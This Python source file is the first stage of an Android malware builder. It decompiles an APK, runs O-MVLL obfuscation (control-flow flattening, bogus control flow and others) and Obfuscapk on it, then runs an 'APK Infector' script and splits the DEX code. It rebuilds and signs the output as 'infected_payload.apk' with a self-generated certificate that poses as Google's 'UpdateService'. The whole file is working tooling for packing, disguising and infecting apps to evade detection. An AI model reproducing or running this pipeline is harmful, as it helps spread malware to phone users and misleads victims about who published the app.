"""Phase 1: Payload Transformation (PC) — 21 functions."""
import os, subprocess, shutil, struct, random, json
from pathlib import Path
from config import TEMP_DIR, APKTOOL, ZIPALIGN, APKSIGNER, KEYTOOL, \
                   OBFUSCAPK_STUB, OMVLL_STUB, APK_INFECTOR, DEXSPLITTER
from utils.logger import setup_logger

logger = setup_logger()

# === PC TOOLS: O-MVLL (4 functions) ===
def _omvll_fla(so_path):
    """F1: O-MVLL -fla (Control Flow Flattening)."""
    logger.info("[*] F1: O-MVLL -fla")
    try:
        subprocess.run(["python3", OMVLL_STUB, so_path, "fla"],
                       capture_output=True, text=True, timeout=60)
        logger.info("[+] -fla done")
    except Exception as e:
        logger.warning(f"[!] -fla skip: {e}")

def _omvll_sub(so_path):
    """F2: O-MVLL -sub (Instruction Substitution)."""
    logger.info("[*] F2: O-MVLL -sub")
    try:
        subprocess.run(["python3", OMVLL_STUB, so_path, "sub"],
                       capture_output=True, text=True, timeout=60)
        logger.info("[+] -sub done")
    except Exception as e:
        logger.warning(f"[!] -sub skip: {e}")

def _omvll_bcf(so_path):
    """F3: O-MVLL -bcf (Bogus Control Flow)."""
    logger.info("[*] F3: O-MVLL -bcf")
    try:
        subprocess.run(["python3", OMVLL_STUB, so_path, "bcf"],
                       capture_output=True, text=True, timeout=60)
        logger.info("[+] -bcf done")
    except Exception as e:
        logger.warning(f"[!] -bcf skip: {e}")

def _omvll_split(so_path):
    """F4: O-MVLL -split (Function Splitting)."""
    logger.info("[*] F4: O-MVLL -split")
    try:
        subprocess.run(["python3", OMVLL_STUB, so_path, "split"],
                       capture_output=True, text=True, timeout=60)
        logger.info("[+] -split done")
    except Exception as e:
        logger.warning(f"[!] -split skip: {e}")

# === OBFUSCAPK: 11 functions ===
def _obfuscapk_all(decompiled):
    """F5-F15: Obfuscapk 11 techniques."""
    logger.info("[*] F5-F15: Obfuscapk (11 techniques)")
    try:
        r = subprocess.run(["python3", OBFUSCAPK_STUB, decompiled],
                           capture_output=True, text=True, timeout=300)
        if r.stdout:
            logger.info(r.stdout.strip()[-500:])
        if r.returncode == 0:
            logger.info("[+] Obfuscapk done")
        else:
            logger.warning(f"[!] Obfuscapk returned {r.returncode}: {r.stderr[:200]}")
    except Exception as e:
        logger.warning(f"[!] Obfuscapk skip: {e}")

# === APK INFECTOR: 5 functions ===
def _apk_infector_all(decompiled):
    """F16-F20: APK Infector 5 functions."""
    logger.info("[*] F16-F20: APK Infector")
    try:
        r = subprocess.run(["python3", APK_INFECTOR, decompiled],
                           capture_output=True, text=True, timeout=120)
        if r.stdout:
            logger.info(r.stdout.strip()[-500:])
        if r.returncode == 0:
            logger.info("[+] APK Infector done")
        else:
            logger.warning(f"[!] APK Infector returned {r.returncode}: {r.stderr[:200]}")
    except Exception as e:
        logger.warning(f"[!] APK Infector skip: {e}")

def _set_sdk_versions(decompiled):
    """Set SDK versions in apktool.yml AND AndroidManifest.xml.

    compileSdkVersion=36 (Android 16), minSdkVersion=33 (Android 13),
    targetSdkVersion=35 (Android 15).
    """
    import re
    # --- 1. apktool.yml (controls minSdk/targetSdk in binary XML) ---
    yml = os.path.join(decompiled, 'apktool.yml')
    if os.path.exists(yml):
        with open(yml, 'r') as f:
            lines = f.readlines()
        out = []
        in_sdk = False
        for line in lines:
            if line.strip() == 'sdkInfo:':
                in_sdk = True
                out.append('sdkInfo:\n')
                out.append('  compileSdkVersion: 36\n')
                out.append('  minSdkVersion: 33\n')
                out.append('  targetSdkVersion: 35\n')
                continue
            if in_sdk:
                if line.startswith('  ') and not line.startswith('    '):
                    continue
                in_sdk = False
            out.append(line)
        if not any('sdkInfo:' in l for l in out):
            for i, line in enumerate(out):
                if line.strip() == 'packageInfo:':
                    out.insert(i, 'sdkInfo:\n')
                    out.insert(i + 1, '  compileSdkVersion: 36\n')
                    out.insert(i + 2, '  minSdkVersion: 33\n')
                    out.insert(i + 3, '  targetSdkVersion: 35\n')
                    break
        with open(yml, 'w') as f:
            f.writelines(out)

    # --- 2. AndroidManifest.xml (compileSdkVersion is preserved from here) ---
    mp = os.path.join(decompiled, 'AndroidManifest.xml')
    if os.path.exists(mp):
        with open(mp, 'r', errors='ignore') as f:
            c = f.read()
        # Update compileSdkVersion in manifest root tag
        c = re.sub(r'android:compileSdkVersion="\d+"', 'android:compileSdkVersion="36"', c)
        # Update compileSdkVersionCodename to match Android 16
        c = re.sub(r'android:compileSdkVersionCodename="[^"]*"', 'android:compileSdkVersionCodename="16"', c)
        # Update platformBuildVersionCode to match compileSdk
        c = re.sub(r'platformBuildVersionCode="\d+"', 'platformBuildVersionCode="36"', c)
        c = re.sub(r'platformBuildVersionName="[^"]*"', 'platformBuildVersionName="16"', c)
        # Ensure <uses-sdk> element exists for minSdk/targetSdk
        # (apktool.yml handles binary form, but explicit XML helps some tools)
        if '<uses-sdk' not in c:
            # Insert right after <manifest> opening tag, before first child
            c = re.sub(
                r'(<manifest[^>]*>\s*)(?=(<[^/]))',
                r'\1    <uses-sdk android:minSdkVersion="33" android:targetSdkVersion="35" />\n',
                c, count=1
            )
        else:
            # Update existing uses-sdk
            c = re.sub(r'<uses-sdk[^>]*>', '<uses-sdk android:minSdkVersion="33" android:targetSdkVersion="35" />', c, count=1)
        with open(mp, 'w', errors='ignore') as f:
            f.write(c)

    logger.info("[+] SDK versions set: compile=36, min=33, target=35")

# === DEX SPLITTER: 1 function ===
def _dexsplitter(decompiled):
    """F21: DexSplitter."""
    logger.info("[*] F21: DEX Splitter")
    dex_path = os.path.join(decompiled, "classes.dex")
    if os.path.exists(dex_path):
        try:
            r = subprocess.run(["python3", DEXSPLITTER, dex_path, "--parts", "3"],
                               capture_output=True, text=True, timeout=60)
            if r.stdout:
                logger.info(r.stdout.strip())
            logger.info("[+] DEX Splitter done")
        except Exception as e:
            logger.warning(f"[!] DEX Splitter skip: {e}")

# === Phase 1 Orchestrator ===
def run(input_apk):
    logger.info("="*60)
    logger.info("[*] PHASE 1: Payload Transformation (21 functions)")
    logger.info("="*60)

    decompiled = str(TEMP_DIR / "phase1_decompiled")
    logger.info("[*] Decompiling...")
    r = subprocess.run([APKTOOL, "d", "--no-res", "-f", "-o", decompiled, input_apk],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        raise Exception(f"apktool d failed: {r.stderr[:500]}")

    # Remove synthetic res/ dir to prevent build errors with "false" layout values
    res_dir = os.path.join(decompiled, "res")
    if os.path.exists(res_dir):
        shutil.rmtree(res_dir)

    _set_sdk_versions(decompiled)

    # O-MVLL on .so files
    lib_dir = os.path.join(decompiled, "lib")
    if os.path.exists(lib_dir):
        for arch in os.listdir(lib_dir):
            arch_path = os.path.join(lib_dir, arch)
            if not os.path.isdir(arch_path): continue
            for f in os.listdir(arch_path):
                if f.endswith('.so'):
                    so_path = os.path.join(arch_path, f)
                    _omvll_fla(so_path)
                    _omvll_sub(so_path)
                    _omvll_bcf(so_path)
                    _omvll_split(so_path)

    # Obfuscapk
    _obfuscapk_all(decompiled)

    # APK Infector
    _apk_infector_all(decompiled)

    # DEX Splitter
    _dexsplitter(decompiled)

    # Rebuild
    rebuilt = str(TEMP_DIR / "phase1_rebuilt.apk")
    logger.info("[*] Rebuilding...")
    r = subprocess.run([APKTOOL, "b", "-o", rebuilt, decompiled],
                       capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        r = subprocess.run([APKTOOL, "b", "--use-aapt2", "-o", rebuilt, decompiled],
                           capture_output=True, text=True, timeout=120)
        if r.returncode != 0:
            raise Exception(f"apktool b failed: {r.stderr[:500]}")

    # Sign
    ks = str(TEMP_DIR / "phase1.jks")
    if not os.path.exists(ks):
        subprocess.run([KEYTOOL, "-genkey", "-v", "-keystore", ks, "-keyalg", "RSA",
                        "-keysize", "2048", "-validity", "10000", "-alias", "release",
                        "-storepass", "phase12026", "-keypass", "phase12026",
                        "-dname", "CN=UpdateService, OU=Android, O=Google LLC, L=MountainView, C=US",
                        "-storetype", "JKS"],
                       capture_output=True, text=True, timeout=30)

    aligned = str(TEMP_DIR / "phase1_aligned.apk")
    subprocess.run([ZIPALIGN, "-v", "-p", "4", rebuilt, aligned],
                   capture_output=True, text=True, timeout=60)
    if not os.path.exists(aligned) or os.path.getsize(aligned) == 0:
        shutil.copy(rebuilt, aligned)

    final = str(TEMP_DIR / "infected_payload.apk")
    subprocess.run([APKSIGNER, "sign", "--ks", ks, "--ks-key-alias", "release",
                   "--ks-pass", "pass:phase12026", "--key-pass", "pass:phase12026",
                   "--v1-signing-enabled", "true", "--v2-signing-enabled", "true",
                   "--v3-signing-enabled", "true", "--out", final, aligned],
                  capture_output=True, text=True, timeout=60)
    if not os.path.exists(final) or os.path.getsize(final) == 0:
        shutil.copy(aligned, final)

    shutil.rmtree(decompiled, ignore_errors=True)
    logger.info(f"[+] Phase 1 Complete: {final}")
    return final
